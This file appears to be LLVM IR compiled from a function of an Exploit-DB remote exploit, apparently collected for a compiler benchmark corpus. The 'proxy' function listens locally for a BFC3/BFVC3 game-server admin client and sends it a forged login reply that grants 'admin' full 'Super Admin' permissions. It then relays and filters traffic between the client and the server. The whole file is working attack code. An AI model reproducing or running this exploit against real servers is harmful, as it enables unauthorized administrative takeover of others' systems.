; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_1183.c_proxy.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_1183.c_proxy.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, i32, %struct.TYPE_2__ }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@INADDR_ANY = common dso_local global i32 0, align 4
@MYPORT = common dso_local global i32 0, align 4
@AF_INET = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [17 x i8] c"- bind port %hu\0A\00", align 1
@SOCK_STREAM = common dso_local global i32 0, align 4
@IPPROTO_TCP = common dso_local global i32 0, align 4
@SOL_SOCKET = common dso_local global i32 0, align 4
@SO_REUSEADDR = common dso_local global i32 0, align 4
@SOMAXCONN = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [62 x i8] c"- launch BFC3 or BFVC3 and sets %s as server and %hu as port\0A\00", align 1
@.str.2 = private unnamed_addr constant [10 x i8] c"127.0.0.1\00", align 1
@.str.3 = private unnamed_addr constant [13 x i8] c"- connected\0A\00", align 1
@.str.4 = private unnamed_addr constant [7 x i8] c"master\00", align 1
@.str.5 = private unnamed_addr constant [1061 x i8] c"null/null/null/0/Map_True/Action-Warn\FF1\FFAction-Kick\FF1\FFAction-Insta-Kick (No Reason)\FF1\FFAction-Ban\FF1\FFAction-Insta-Ban (No Reason)\FF1\FFAction-Remove Ban\FF1\FFAction-Clear Banlist\FF1\FFAction-Force to Other Team\FF1\FFAction-Kill Player\FF1\FFAction-Send Message to Server\FF1\FFGame-Pause\FF1\FFGame-Toggle Auto-Balance\FF1\FFAction-Request PB Screenshot\FF1\FFBFVC3-Maps Change Maps\FF1\FFBFVC3-Maps Change 2 Map NOT in \FF1\FFBFVC3-Maps Restart Map\FF1\FFBFVC3-Maps Set Next Map\FF1\FFBFVC3-Admin Change Server Settings\FF1\FFBFVC3-Admin Change FF Settings\FF1\FFBFVC3-Admin Change Misc Settings\FF1\FFBFVC3-Admin Change Voting Settings\FF1\FFUSERS-Access User Accounts\FF1\FFUSERS-Edit User Profiles\FF1\FFUSERS-Create User\FF1\FFUSERS-Edit User\FF1\FFUSERS-Delete User\FF1\FFBFVCC-Access Manager Control Panel\FF1\FFBFVCC-Access to Auto Admin Settings\FF1\FFBFVCC-Load Manager Profiles\FF1\FFBFVCC-Save Changes to Profiles\FF1\FFBFVCC-Create Manager Profiles\FF1\FFBFVCC-Delete Manager Profiles\FF1\FFCC-Access the CC Editor\FF1\FFCC-Save Changes to CC Profiles\FF1\FFCC-Create new CC Profiles\FF1\FFCC-Delete CC Profile\FF1\FFCC-Change a Maps CC Profile\FF1\FFPB-Edit PB Config Files\FF1\FF\00", align 1
@.str.6 = private unnamed_addr constant [6 x i8] c"15567\00", align 1
@.str.7 = private unnamed_addr constant [7 x i8] c"admin\FF\00", align 1
@.str.8 = private unnamed_addr constant [5 x i8] c"True\00", align 1
@.str.9 = private unnamed_addr constant [12 x i8] c"Super Admin\00", align 1
@.str.10 = private unnamed_addr constant [2 x i8] c"0\00", align 1
@stdout = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @proxy(i32 %0, i32* %1, i32 %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32*, align 8
  %6 = alloca i32, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  store i32 %0, i32* %4, align 4
  store i32* %1, i32** %5, align 8
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %11, align 4
  %15 = load i32, i32* @INADDR_ANY, align 4
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 2
  %17 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %16, i32 0, i32 0
  store i32 %15, i32* %17, align 4
  %18 = load i32, i32* @MYPORT, align 4
  %19 = call i32 @htons(i32 %18)
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 1
  store i32 %19, i32* %20, align 4
  %21 = load i32, i32* @AF_INET, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %7, i32 0, i32 0
  store i32 %21, i32* %22, align 4
  store i32 12, i32* %13, align 4
  %23 = load i32, i32* @MYPORT, align 4
  %24 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str, i64 0, i64 0), i32 %23)
  %25 = load i32, i32* @AF_INET, align 4
  %26 = load i32, i32* @SOCK_STREAM, align 4
  %27 = load i32, i32* @IPPROTO_TCP, align 4
  %28 = call i32 @socket(i32 %25, i32 %26, i32 %27)
  store i32 %28, i32* %9, align 4
  %29 = load i32, i32* %9, align 4
  %30 = icmp slt i32 %29, 0
  br i1 %30, label %31, label %33

31:                                               ; preds = %3
  %32 = call i32 (...) @std_err()
  br label %33

33:                                               ; preds = %31, %3
  %34 = load i32, i32* %9, align 4
  %35 = load i32, i32* @SOL_SOCKET, align 4
  %36 = load i32, i32* @SO_REUSEADDR, align 4
  %37 = bitcast i32* %11 to i8*
  %38 = call i64 @setsockopt(i32 %34, i32 %35, i32 %36, i8* %37, i32 4)
  %39 = icmp slt i64 %38, 0
  br i1 %39, label %40, label %42

40:                                               ; preds = %33
  %41 = call i32 (...) @std_err()
  br label %42

42:                                               ; preds = %40, %33
  %43 = load i32, i32* %9, align 4
  %44 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %45 = call i64 @bind(i32 %43, %struct.sockaddr* %44, i32 12)
  %46 = icmp slt i64 %45, 0
  br i1 %46, label %47, label %49

47:                                               ; preds = %42
  %48 = call i32 (...) @std_err()
  br label %49

49:                                               ; preds = %47, %42
  %50 = load i32, i32* %9, align 4
  %51 = load i32, i32* @SOMAXCONN, align 4
  %52 = call i64 @listen(i32 %50, i32 %51)
  %53 = icmp slt i64 %52, 0
  br i1 %53, label %54, label %56

54:                                               ; preds = %49
  %55 = call i32 (...) @std_err()
  br label %56

56:                                               ; preds = %54, %49
  %57 = load i32, i32* @MYPORT, align 4
  %58 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.1, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0), i32 %57)
  %59 = load i32, i32* %9, align 4
  %60 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %61 = call i32 @accept(i32 %59, %struct.sockaddr* %60, i32* %13)
  store i32 %61, i32* %10, align 4
  %62 = load i32, i32* %10, align 4
  %63 = icmp slt i32 %62, 0
  br i1 %63, label %64, label %66

64:                                               ; preds = %56
  %65 = call i32 (...) @std_err()
  br label %66

66:                                               ; preds = %64, %56
  %67 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.3, i64 0, i64 0))
  %68 = load i32, i32* %10, align 4
  %69 = call i32 @send_bfcc(i32 %68, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.4, i64 0, i64 0), i8* getelementptr inbounds ([1061 x i8], [1061 x i8]* @.str.5, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.6, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.7, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i64 0, i64 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.9, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.10, i64 0, i64 0), i32* null)
  %70 = load i32, i32* %4, align 4
  %71 = load i32, i32* %10, align 4
  %72 = icmp sgt i32 %70, %71
  br i1 %72, label %73, label %75

73:                                               ; preds = %66
  %74 = load i32, i32* %4, align 4
  br label %77

75:                                               ; preds = %66
  %76 = load i32, i32* %10, align 4
  br label %77

77:                                               ; preds = %75, %73
  %78 = phi i32 [ %74, %73 ], [ %76, %75 ]
  %79 = add nsw i32 %78, 1
  store i32 %79, i32* %14, align 4
  br label %80

80:                                               ; preds = %145, %134, %107, %77
  %81 = call i32 @FD_ZERO(i32* %8)
  %82 = load i32, i32* %4, align 4
  %83 = call i32 @FD_SET(i32 %82, i32* %8)
  %84 = load i32, i32* %10, align 4
  %85 = call i32 @FD_SET(i32 %84, i32* %8)
  %86 = load i32, i32* %14, align 4
  %87 = call i64 @select(i32 %86, i32* %8, i32* null, i32* null, i32* null)
  %88 = icmp slt i64 %87, 0
  br i1 %88, label %89, label %91

89:                                               ; preds = %80
  %90 = call i32 (...) @std_err()
  br label %91

91:                                               ; preds = %89, %80
  %92 = load i32, i32* %10, align 4
  %93 = call i64 @FD_ISSET(i32 %92, i32* %8)
  %94 = icmp ne i64 %93, 0
  br i1 %94, label %95, label %118

95:                                               ; preds = %91
  %96 = load i32, i32* %10, align 4
  %97 = load i32*, i32** %5, align 8
  %98 = load i32, i32* %6, align 4
  %99 = call i32 @recv_bfcc(i32 %96, i32* %97, i32 %98)
  store i32 %99, i32* %12, align 4
  %100 = load i32*, i32** %5, align 8
  %101 = load i32, i32* %12, align 4
  %102 = load i32, i32* @stdout, align 4
  %103 = call i32 @fwrite(i32* %100, i32 %101, i32 1, i32 %102)
  %104 = load i32*, i32** %5, align 8
  %105 = call i64 @check_drop(i32* %104)
  %106 = icmp ne i64 %105, 0
  br i1 %106, label %107, label %108

107:                                              ; preds = %95
  br label %80

108:                                              ; preds = %95
  %109 = load i32, i32* %4, align 4
  %110 = load i32*, i32** %5, align 8
  %111 = load i32, i32* %12, align 4
  %112 = call i32 @send(i32 %109, i32* %110, i32 %111, i32 0)
  store i32 %112, i32* %12, align 4
  %113 = load i32, i32* %12, align 4
  %114 = icmp slt i32 %113, 0
  br i1 %114, label %115, label %117

115:                                              ; preds = %108
  %116 = call i32 (...) @std_err()
  br label %117

117:                                              ; preds = %115, %108
  br label %118

118:                                              ; preds = %117, %91
  %119 = load i32, i32* %4, align 4
  %120 = call i64 @FD_ISSET(i32 %119, i32* %8)
  %121 = icmp ne i64 %120, 0
  br i1 %121, label %122, label %145

122:                                              ; preds = %118
  %123 = load i32, i32* %4, align 4
  %124 = load i32*, i32** %5, align 8
  %125 = load i32, i32* %6, align 4
  %126 = call i32 @recv_bfcc(i32 %123, i32* %124, i32 %125)
  store i32 %126, i32* %12, align 4
  %127 = load i32*, i32** %5, align 8
  %128 = load i32, i32* %12, align 4
  %129 = load i32, i32* @stdout, align 4
  %130 = call i32 @fwrite(i32* %127, i32 %128, i32 1, i32 %129)
  %131 = load i32*, i32** %5, align 8
  %132 = call i64 @check_drop(i32* %131)
  %133 = icmp ne i64 %132, 0
  br i1 %133, label %134, label %135

134:                                              ; preds = %122
  br label %80

135:                                              ; preds = %122
  %136 = load i32, i32* %10, align 4
  %137 = load i32*, i32** %5, align 8
  %138 = load i32, i32* %12, align 4
  %139 = call i32 @send(i32 %136, i32* %137, i32 %138, i32 0)
  store i32 %139, i32* %12, align 4
  %140 = load i32, i32* %12, align 4
  %141 = icmp slt i32 %140, 0
  br i1 %141, label %142, label %144

142:                                              ; preds = %135
  %143 = call i32 (...) @std_err()
  br label %144

144:                                              ; preds = %142, %135
  br label %145

145:                                              ; preds = %144, %118
  br label %80
}

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @std_err(...) #1

declare dso_local i64 @setsockopt(i32, i32, i32, i8*, i32) #1

declare dso_local i64 @bind(i32, %struct.sockaddr*, i32) #1

declare dso_local i64 @listen(i32, i32) #1

declare dso_local i32 @accept(i32, %struct.sockaddr*, i32*) #1

declare dso_local i32 @send_bfcc(i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i32*) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i64 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @recv_bfcc(i32, i32*, i32) #1

declare dso_local i32 @fwrite(i32*, i32, i32, i32) #1

declare dso_local i64 @check_drop(i32*) #1

declare dso_local i32 @send(i32, i32*, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
